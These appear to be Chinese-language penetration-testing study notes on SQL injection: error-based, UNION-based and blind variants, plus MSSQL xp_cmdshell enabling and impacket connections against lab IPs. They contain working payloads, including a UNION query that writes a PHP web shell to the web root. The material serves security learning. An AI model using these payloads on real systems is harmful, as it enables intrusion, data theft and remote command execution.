### Error-Based SQL Injection

輸入`hack' OR 1=1 -- `，
`SELECT * FROM users WHERE user_name= 'hack' OR 1=1 --
`

由於`1=1`是true所以會被執行，`--`是註解，後面語法直接忽略

在`in`後面加入sql語法可以執行任意語法

查詢版本號:`' or 1=1 in (select @@version) -- `


#### UNION Based SQL Injection

UNION關鍵字 有助於利用，因為它允許執行額外的 SELECT 語句並在相同查詢中提供結果，從而將兩個查詢連接到一個語句中。

為了讓UNION SQLi 攻擊發揮作用，我們首先需要滿足兩個條件：

1. 注入的UNION查詢必須包含與原始查詢相同數量的欄位。
2. 每列之間的資料類型需要相容。

為了發現正確的列數，我們可以將以下注入的查詢提交到搜尋欄中：
`' ORDER BY 1-- //`

假設確認是五列，就可以任意輸入
' UNION SELECT null, null, database(), user(), @@version  -- 

利用UNION將webshell寫入`/vat/ww/html/tmp/`
```
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```
### 盲注 Blind SQL Injection
分成下面兩種: 布林、時間

#### 布林盲注(Boolean-Based Blind SQL Injection)
```
http://192.168.0.1/test.php?user=attack' AND 1=1 -- //
```
由於1=1始終為 TRUE，因此僅當使用者存在於資料庫中時應用程式才會傳回值

透過查詢回應的布林值，推測查詢結果的真偽來進一步猜測  
`AND 1=1`為true>可能返回資料，`AND 1=2`為false > 返回空或錯誤資訊
符合兩個條件則可能有SQL注入


#### 時間盲注(time-Based Blind SQL Injection)
```
http://192.168.0.1/test.php?user=attack' AND IF (1=1, sleep(3),'false') -- //
```
如料存在注入則會延遲三秒

### 使用 xp_cmdshell 利用 MSSQL 資料庫
 xp_cmdshell 函數接受一個字串並將其傳遞給命令 shell 來執行。該函數將任何輸出傳回為文字行。該函數預設已停用，一旦啟用，必須使用EXECUTE關鍵字而不是 SELECT 來呼叫它。
 
啟用xp_cmdshell
```
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

### MSSQL(windows)

用impacket連線，透過提供使用者名稱、密碼和遠端 IP 以及-windows-auth關鍵字來連接到執行 MSSQL 的遠端 Windows 電腦。這會強制進行 NTLM 驗證（而不是 Kerberos）。
```
impacket-mssqlclient Administrator:password@192.168.0.1 -windows-auth
```

檢查版本
```
SELECT @@version;
```
列出資料庫
```
SELECT name FROM sys.databases;
```
